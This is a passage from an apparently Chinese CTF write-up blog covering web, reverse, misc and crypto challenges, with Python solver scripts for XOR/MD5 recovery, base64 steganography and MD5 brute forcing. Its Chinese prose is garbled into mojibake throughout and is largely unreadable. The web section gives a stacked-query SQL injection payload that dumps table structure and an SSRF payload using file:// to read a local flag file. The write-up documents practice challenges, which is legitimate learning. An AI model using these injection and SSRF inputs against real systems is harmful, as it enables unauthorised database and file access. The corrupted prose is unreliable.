tables #</code> ç›´æ¥çˆ†å‡ºåº“åå’Œè¡¨åäº†<br><code>1&#39;;desc flag # </code> çˆ†å‡ºå­—æ®µå<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f11c852b4304418e9c58a9f0376e48e5.png" alt="å›¾ç‰‡.png"><br>ç„¶åå°±å‘ç°ç‰¹æ®Šå­—ç¬¦ä¸²enjoy_Sq1i11_qu3ryy åŒ…è£¹ctf{}æäº¤äº†<br><a name='8'></a></p><h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>ç™½ç»™ç™½ç»™</p><p>åˆ©ç”¨file://åè®®, æç¤ºè¯´çš„å¾ˆæ¸…æ¥šäº†å°±åœ¨/flag</p><p>payload: <code>?url=file:///flag</code><br><a name='9'></a></p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>æœå•Šæœæœå•Šæœ, çœŸçš„æ˜¯æœå‡ºæ¥çš„flagå“¦(æŒ‰ç€æç¤ºæœå°±è¡Œäº†<br><a name='10'></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><blockquote><p>å› ä¸ºæœ¬èº«å°±æ˜¯ä¸ºäº†æ‹¿åˆ†æ‰åšçš„RE, æ‰€ä»¥wpå°±æ¯”è¾ƒç®€çŸ­äº†(çœŸä¸æƒ³å†™hhh</p><blockquote><p>å¯ä»¥å»çœ‹çœ‹Misakaå¤§ä½¬çš„wp</p></blockquote></blockquote><h2 id="æ‰è¿·è—"><a href="#æ‰è¿·è—" class="headerlink" title="æ‰è¿·è—"></a>æ‰è¿·è—</h2><p>Idaæ‰“å¼€æ–‡ä»¶, éšä¾¿ç¿»äº†ç¿», å‘ç°<br> <img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-4dae16af3f344b97a2c1ba697cafc21a.png" alt="å›¾ç‰‡.png"><br>æ ¹æ®è¯­ä¹‰æ‰‹åŠ¨æ‹¼å›flag<br><a name='11'></a></p><h2 id="basic-hash"><a href="#basic-hash" class="headerlink" title="basic_hash"></a>basic_hash</h2><p>æˆ‘å°±åªä¼šF5! è¿˜å¥½ä¸»å‡½æ•°å¾ˆç®€å•, å°±æ˜¯è¦æ±‚åšé¢˜äººåˆ©ç”¨å¼‚æˆ–è¿ç®—çš„ç‰¹ç‚¹A+B+B = Aè¿˜åŸä¸¤ä¸ªmd5å€¼,ç„¶åæ‰”åˆ°æŸ<a href="https://www.cmd5.com/">MD5<del>çˆ†ç ´</del>ç½‘ç«™</a>è·å¾—flag.<br>æŠŠidaä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å€¼æ‰‹åŠ¨è¾“å…¥åˆ°è„šæœ¬ä¸­,è·‘è„šæœ¬å°±å®Œäº‹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v9 = [<span class="number">70</span>, -<span class="number">121</span>, -<span class="number">115</span>, <span class="number">4</span>, -<span class="number">67</span>, <span class="number">52</span>, <span class="number">126</span>, <span class="number">42</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">79</span>, <span class="number">91</span>, -<span class="number">61</span>, -<span class="number">63</span>, <span class="number">6</span>, -<span class="number">14</span>]</span><br><span class="line">v26 = [<span class="number">59</span>, -<span class="number">87</span>, <span class="number">103</span>, -<span class="number">122</span>, -<span class="number">46</span>, -<span class="number">112</span>, <span class="number">104</span>, -<span class="number">30</span>, -<span class="number">92</span>, <span class="number">113</span>, <span class="number">125</span>, -<span class="number">85</span>, -<span class="number">14</span>, <span class="number">41</span>, -<span class="number">24</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b11111111</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    <span class="keyword">if</span> v9[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v9[i] = <span class="built_in">abs</span>(v9[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v26)):</span><br><span class="line">    <span class="keyword">if</span> v26[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v26[i] = <span class="built_in">abs</span>(v26[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">input1_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x30</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v9])</span><br><span class="line">input2_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x20</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v26])</span><br><span class="line">print(input1_md5)</span><br><span class="line">print(input2_md5)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‹¿åˆ°ä¸¤ä¸ªMD5äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">76b7bd348d044e1a41427f6bf3f136c2</span><br><span class="line">1b8947a6f2b048c284515d8bd209c83f</span><br></pre></td></tr></table></figure><p>æ‰”è¿›ç½‘ç«™, å¾—åˆ°flag<br><a name='12'></a></p><h2 id="ByteCode"><a href="#ByteCode" class="headerlink" title="ByteCode"></a>ByteCode</h2><p>å› ä¸ºçˆ½å“¥è¯´å¾ˆç®€å•, æ‰€ä»¥æˆ‘å°±æ¥çœ‹çœ‹, ç™¾åº¦äº†ä¸€ä¸‹ByteCode. çŸ¥é“æ˜¯å°±æ˜¯ä¸€å †æ“ä½œä¹‹å. æ‰¾åˆ°ByteCodeå’Œæ“ä½œçš„å¯¹åº”è¡¨! æ‹¿å‡ºçº¸ç¬”! ç‚¹å¼€è®¡ç®—æœº! ä¸€ç‚¹ä¸€ç‚¹æ‰‹åŠ¨å¾€å›ç®—â€¦(æ‰‹åŠ¨ç®—çš„æ„Ÿè§‰é’ˆä¸æˆ³<br>ç®—å®Œasciiç å…¨éƒ¨è½¬æˆå­—ç¬¦ä¸²å°±æ˜¯flagäº†<br><a name='13'></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><blockquote><p>è¯´å®è¯æ²¡æƒ³åˆ°Miscè¿™ä¹ˆå¤šé¢˜, ä¸è¿‡Miscåšèµ·æ¥å°±æ„Ÿè§‰åƒçŒœè°œä¸€æ ·, ä¹ŸæŒºæœ‰è¶£çš„.</p></blockquote><h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><p>ä¸äºæ˜¯æˆ‘æœ€æ‹¿æ‰‹çš„ç­¾åˆ°é¢˜.ç§’è§£flag 2333<br><a name='14'></a></p><h2 id="Look-at-your-keyboard"><a href="#Look-at-your-keyboard" class="headerlink" title="Look_at_your_keyboard"></a>Look_at_your_keyboard</h2><p>é¢˜ç›®éƒ½è¯´äº†çœ‹é”®ç›˜å’¯. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji</span><br></pre></td></tr></table></figure><p>é”®ç›˜ä¸Šæ˜¯æ€æ ·çš„å°±æ€æ ·çš„(æ‰€ä»¥åšçš„æ—¶å€™è§‰å¾—Sæ˜¯8, Iæ˜¯1çš„è‚¯å®šä¸æ˜¯æˆ‘ä¸€ä¸ªå§!<br>ç»“æœæ˜¯ctfisfun, å¯¹ç€é”®ç›˜çœ‹å°±èƒ½çœ‹å‡ºæ¥äº†.<br><a name='15'></a></p><h2 id="Buddha"><a href="#Buddha" class="headerlink" title="Buddha"></a>Buddha</h2><p>ä¹Ÿæ²¡å•¥å¥½è¯´çš„.<br>æ–°ä½›æ›°-&gt;base64-&gt;æ …æ å¯†ç <br><a name='16'></a></p><h2 id="Do-you-know-Xp0int"><a href="#Do-you-know-Xp0int" class="headerlink" title="Do you know Xp0int"></a>Do you know Xp0int</h2><p>ç”¨è®°äº‹æœ¬æ‰“å¼€å›¾ç‰‡.<br>ç”¨<del>çœ¼ç›ä¸€è¡Œä¸€è¡Œçš„çœ‹æœ‰æ²¡æœ‰flag</del>æœç´¢<code>ctf&#123;</code> ç»“æœå•¥éƒ½æ²¡<br>æœ<code>&#123;</code> å°±æ‰¾åˆ°flagäº†. ä¼¼ä¹æœ‰ä¸ªå¯ä»¥è·‘å‡ºæ–‡ä»¶ä¸­å‡ºç°çš„å­—ç¬¦ä¸²çš„è„šæœ¬<br><a name='17'></a></p><h2 id="close-base"><a href="#close-base" class="headerlink" title="close_base"></a>close_base</h2><p>base64è§£ç å‘ç°æ˜¯Cè¯­è¨€æºç  (è¾“å‡ºä¸æ˜¯hello,world, å·®è¯„!<br>ä¼°è®¡æ˜¯base64éšå†™äº†, æ¯•ç«Ÿæ¯ä¸€è¡Œbase64ç¼–ç ç»“å°¾éƒ½æœ‰ç­‰å·, è‚¯å®šèƒ½è—å¾ˆå¤šä¸œè¥¿2333<br>æ‰€ä»¥base64éšå†™æ˜¯å•¥?è¿™é‡Œä¸å†™äº†â€¦<br>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2text</span>(<span class="params">Bin</span>):</span></span><br><span class="line">    Hex = <span class="built_in">hex</span>(<span class="built_in">int</span>(Bin, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">2</span>: Hex = <span class="string">&#x27;0&#x27;</span> + Hex</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [Hex[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base)):</span><br><span class="line">    base[i] = base[i][::-<span class="number">1</span>][<span class="number">1</span>:<span class="number">5</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> j != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            o = <span class="built_in">bin</span>(table.index(j))[<span class="number">2</span>:]</span><br><span class="line">            tmp += <span class="string">&#x27;0&#x27;</span> * (<span class="number">6</span> - <span class="built_in">len</span>(o)) + o</span><br><span class="line">    tmp = tmp + <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - <span class="built_in">len</span>(res))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;==&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">16</span>:<span class="number">18</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctf&#123;&#x27;</span> + bin2text(res) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„å°±æ˜¯flagäº†(å…·ä½“åŸç†çœŸçš„åˆ°å¤„éƒ½æœ‰çš„,æ‰¾å°±å®Œäº‹äº†<br><a name='18'></a></p><h2 id="PMGBA"><a href="#PMGBA" class="headerlink" title="PMGBA"></a>PMGBA</h2><p>åšçš„æœ€è¿‡ç˜¾çš„ä¸€é¢˜(ä½†æ˜¯è¢«è‡ªå·±è ¢åˆ°äº†<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-9bfe0f9125864a95ac95233e8d3b220d.png" alt="å›¾ç‰‡.png"></p><p>å¼€å±€ä¸€å¼ å›¾, æ–‡ä»¶å…¨é æ‹†.<br>è¯´å®è¯ä¸€å¼€å§‹æ‹¿åˆ°å›¾æ„Ÿè§‰æŒºç†Ÿæ‚‰çš„, å°±æ˜¯è®°ä¸èµ·æ¥è¿™æ˜¯ä»€ä¹ˆâ€¦<br>ç›´åˆ°å»ç™¾åº¦PMGBAçš„æ„æ€æ‰çŸ¥é“æ˜¯å®å¯æ¢¦.è¿™ä¸å°±æ˜¯æˆ‘ä¸Šå­¦æœŸç»ƒçº§åˆ·çš„æ€ªå—!</p><p>æˆ‘ä¹Ÿç®—æ˜¯åŠå¹´çš„å®å¯æ¢¦è€ç©å®¶äº†(ä¿Šå¼ºæ‰æ˜¯å®å¯æ¢¦å¤§å¸ˆ!<br>é©¬ä¸Šè·‘å»é—®ä¿Šå¼ºâ€ä¸Šå­¦æœŸæˆ‘åˆ·ç­‰çº§åˆ·çš„é‚£ä¸ªæœ‰26ä¸ªå½¢æ€çš„å­—æ¯æ€ªå«ä»€ä¹ˆâ€<br>â€˜æœªçŸ¥å›¾è…¾â€™</p><p>é©¬ä¸Šå»æ‰¾å›¾é‰´, å¯¹åº”å›¾é‰´å¾—åˆ°å­—ç¬¦ä¸²remember to examine the.<br>ä¸€å¼€å§‹æ‹¿åˆ°è¿™ä¸ªæˆ‘è¿˜ä»¥ä¸ºå°±æ˜¯æƒ³è®©æˆ‘æ£€æŸ¥è¿™å¼ å›¾ç‰‡çš„æ„æ€(é¬¼çŸ¥é“è¿™æ˜¯flagçš„å‰åŠéƒ¨åˆ†å•Šå–‚</p><p>æ‰”binwalkè·‘äº†ä¸€ä¸‹å‘ç°ç¡®å®ä¸æ­¢ä¸€å¼ å›¾ç‰‡.ç”±äºè¢«foremostå‘è¿‡æ‰€ä»¥èƒ½æ‰‹åŠ¨åˆ†æ–‡ä»¶å°±æ‰‹åŠ¨åˆ†äº†. ç”¨winhexæ‰“å¼€å›¾ç‰‡, å¯¹ç…§è¿™æ–‡ä»¶å¤´æ–‡ä»¶å°¾, åˆ†å‡ºäº†ä¸‰å¼ å›¾(åŒ…æ‹¬æœ€å¼€å§‹çš„æœªçŸ¥å›¾è…¾</p><p>æœ€å¼€å§‹æ³¨æ„åˆ°çš„å…¶å®æ˜¯ç¬¬ä¸‰å¼ å›¾, è¿™æ˜¯æˆ‘ç¬¬ä¸€ä¸ªç»ƒåˆ°5vçš„å®å¯æ¢¦, å¡è’‚ç‹—!<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6036d9f95b4448bd9daebe6d152ed46c.png" alt="å›¾ç‰‡.png"><br>æ‹–è¿›Stegsolveåˆ†ææ²¡æœ‰ä»€ä¹ˆç»“æœå. å†³å®šçœ‹çœ‹æ˜¯ä¸æ˜¯LSB. äºæ˜¯åˆæŠŠå¡è’‚ç‹—æ‰”è¿›zsteg, å‡ºæ¥äº†ä¸€ä¸²å­—ç¬¦ä¸²â€™pwd is 58growliness\nâ€™. </p><p>å¯†ç æ˜¯58growliness?</p><p>ä¸çŸ¥é“è¿™ä¸ªå¯†ç æ˜¯ä¸ªå•¥ç›´åˆ°ä»ç¬¬äºŒå¼ å›¾é‡Œåˆ†å‡ºæ®µbase64, è§£ç åå‘ç°æ˜¯ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…. å¯†ç å°±æ˜¯58growliness</p><p>é‡Œé¢ä¸€ä¸ªtxt, å†…å®¹å…¨æ˜¯pi ka chuçš„ç»„åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... åé¢è¿˜æœ‰å¾ˆå¤š</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯æŸç§åŠ å¯†, ä½†æ˜¯å´æœä¸åˆ°.ä½†åé¢æ‰¾åˆ°ä¸€ç¯‡å¤§æ¦‚è®²çš„æ˜¯ç”¨çš®å¡ä¸˜è¯­ç¼–ç¨‹çš„æ–‡ç« , å¤§æ¦‚å†…å®¹å°±æ˜¯å¥—ç”¨brainfuckçš„è¯­æ³•æ¥ç¼–ç¨‹. æ‰€ä»¥æ¥è¯•è¯•çœ‹æ˜¯ä¸æ˜¯brainfuck. </p><p>æ ¹æ®å­—ç¬¦å‡ºç°çš„é¢‘ç‡è‡ªå·±å¼ºè¡Œè„‘éƒ¨å›äº†å¯¹åº”è¡¨(dalaoè¯´githubä¸Šæœ‰!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dit=&#123; </span><br><span class="line"><span class="string">&#x27;pi&#x27;</span>:<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ka&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chu&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pika&#x27;</span>:<span class="string">&#x27;[&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pipi&#x27;</span>:<span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pichu&#x27;</span>:<span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pikachu&#x27;</span>:<span class="string">&#x27;.&#x27;</span>, </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿˜åŸå›brainfuckä»£ç åè¿è¡Œå¾—åˆ°çš„ç»“æœä¸ºfoo bar</p><p>äº‹å®ä¸Šæ‹¼æ¥å‰é¢çš„remember to examine the foo bar å°±æ˜¯flagäº†.<br>ä½†æˆ‘å´æ²¡æœ‰æƒ³åˆ°â€¦(è°æƒ³çš„åˆ°å•Š<br>æ‰€ä»¥ä¸€ç›´å¡ç€ä¸çŸ¥é“flagæ˜¯å•¥.ç›´åˆ°å‘¨ä¸€é©¬å…‹æ€è¯¾æƒ³ç€éšä¾¿è¯•ä¸€ä¸‹, æ‰æäº¤æˆåŠŸâ€¦(correctå‡ºæ¥çš„æ—¶å€™äººéƒ½å‚»äº†..<br><del>è¿˜æ˜¯è„‘æ´ä¸å¤Ÿå¤§å—</del><br><a name='19'></a></p><h2 id="é›†é½äº”é¾™ç "><a href="#é›†é½äº”é¾™ç " class="headerlink" title="é›†é½äº”é¾™ç "></a>é›†é½äº”é¾™ç </h2><p>ä¸€å¤§å †çš„æ–‡ä»¶, åå­—å…¨éƒ½æ˜¯base64. æƒ³çœ‹çœ‹å…¨éƒ¨è§£ç ä¼šä¸ä¼šæœ‰ä»€ä¹ˆçº¿ç´¢.<br>å†™äº†ä¸ªè„šæœ¬æ¥è§£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;problem/&#x27;</span></span><br><span class="line"></span><br><span class="line">filenames = []</span><br><span class="line"><span class="keyword">for</span> root, ds, fs <span class="keyword">in</span> os.walk(base):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">        print(f, b64decode(f).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)) <span class="comment"># è¾“å‡ºæ–‡ä»¶åå’Œè§£ç ä¹‹åçš„æ–‡ä»¶å</span></span><br></pre></td></tr></table></figure><p>æœç„¶é‡Œé¢æœ‰äº”ä¸ªå¾ˆç‰¹æ®Šçš„æ–‡ä»¶, è§£ç ä¹‹åæ˜¯æ­£å¸¸çš„å­—ç¬¦ä¸².<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-0dfa9dba42d942048201e980ae4a9e65.png" alt="å›¾ç‰‡.png"><br>å°±æ˜¯åç¼€å¸¦oneçš„æ–‡ä»¶(å…¶ä»–çš„æ˜¯åé¢è§£é¢˜çš„æ–‡ä»¶</p><p>winhexæ‰“å¼€first_oneå’Œlast!_one å‘ç°ä¼¼ä¹æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…è¢«æ‹†æˆäº”ä»½äº†.<br>å°è¯•è¿˜åŸå›å», ä½†æ˜¯ä¸çŸ¥é“ä¸­é—´ä¸‰ä¸ªå‹ç¼©åŒ…çš„é¡ºåº. äºæ˜¯å†™äº†ä¸ªè„šæœ¬æ¥æ‰‹åŠ¨å°è¯•(å› ä¸ºå°±3ä¸ªæ–‡ä»¶å°±8ç§ç»„åˆ, è‡ªå·±è°ƒæ¢é¡ºåºå°±è¡Œäº†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filename = &#123;</span><br><span class="line">    <span class="string">&#x27;fi&#x27;</span>: <span class="string">&#x27;first_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fu&#x27;</span>: <span class="string">&#x27;funny_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;la&#x27;</span>: <span class="string">&#x27;last!_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sm&#x27;</span>: <span class="string">&#x27;smart_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cu&#x27;</span>: <span class="string">&#x27;cute__one&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename[i], <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files[i] = f.read()</span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line">file = files[<span class="string">&#x27;fi&#x27;</span>] + files[<span class="string">&#x27;cu&#x27;</span>] + files[<span class="string">&#x27;sm&#x27;</span>] + files[<span class="string">&#x27;fu&#x27;</span>] + files[<span class="string">&#x27;la&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è¯•åˆ°ç¬¬äº”ä¸ªçš„æ—¶å€™å‹ç¼©åŒ…å°±èƒ½æ­£å¸¸çš„è§£å‹äº†.<br>è§£å‹å‡ºæ¥ä¸€ä¸ªflagæ–‡ä»¶, winhexæ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯jpgçš„æ–‡ä»¶å¤´.<br>åç¼€æ”¹æˆjpgåæ‰“å¼€<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-ca5062bb93694bf4a12349419a7457bd.png" alt="å›¾ç‰‡.png"><br><a name='20'></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote><p>æœ€å–œæ¬¢çš„å¯†ç å­¦! è¿™æ¬¡æƒ³ç€è¦åšå®Œå¯†ç çš„, å¯æƒœæœ€åä¸€é“é¢˜æ²¡æœ‰åšå‡ºæ¥. æœ‰è¶£çš„åŠ å¯†å¤ªéš¾äº†, é™„ä»¶åªæœ‰ä¸€æ®µåƒbaseçš„ç¼–ç , æ²¡ä»€ä¹ˆæ€è·¯â€¦..<br><a name='21'></a></p></blockquote><h2 id="ç¢°ç¢°è½¦"><a href="#ç¢°ç¢°è½¦" class="headerlink" title="ç¢°ç¢°è½¦"></a>ç¢°ç¢°è½¦</h2><p>è¿™é¢˜æ„Ÿè§‰å°±åƒæ˜¯proof_of_workâ€¦<br>å•çº¯çš„çˆ†ç ´md5<br>ç›´æ¥ä¸Šè„šæœ¬æŠŠ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">STR1 = <span class="string">&#x27;AGVSCF&#x27;</span></span><br><span class="line">STR2 = <span class="string">&#x27;TZV&#x27;</span></span><br><span class="line">STR3 = <span class="string">&#x27;WBGVHC&#x27;</span></span><br><span class="line">STR4 = <span class="string">&#x27;U&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">            STR = STR1 + i + STR2 + j + STR3 + k + STR4</span><br><span class="line">            <span class="keyword">if</span> md5(STR.encode()).hexdigest().startswith(<span class="string">&#x27;a8f738&#x27;</span>):</span><br><span class="line">                print(STR, md5(STR.encode()).hexdigest())</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœa8f738a65b715ea54900b180865b20af</p><h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" 